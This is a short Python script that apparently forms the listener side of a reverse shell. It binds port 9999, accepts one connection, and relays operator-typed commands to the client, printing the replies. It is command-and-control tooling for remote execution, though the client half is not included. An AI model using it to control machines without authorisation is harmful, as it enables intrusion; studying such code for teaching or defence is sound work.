import socket
import sys

# create a socket
def create_socket():
    try:
        global host
        global port
        global s
        host  = ""
        port = 9999

        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: "+str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("Binding the port: "+str(port))

        s.bind((host,port))
        s.listen(5)# listen for connections
    except socket.error as msg:
        print("Socket binding error : "+str(msg) + "\n"  + "Retrying......")
        bind_socket()

# establish connection with client(once socket is listening)
def socket_accept():
    conn ,address = s.accept()
    print("Connection has been established!  |" + "IP "+address[0]+ "Port "+str(address[1]))
    send_commands(conn)
    conn.close()

# Send commands to client
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) >0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")

# main function
def main():
    create_socket()
    bind_socket()
    socket_accept()


main()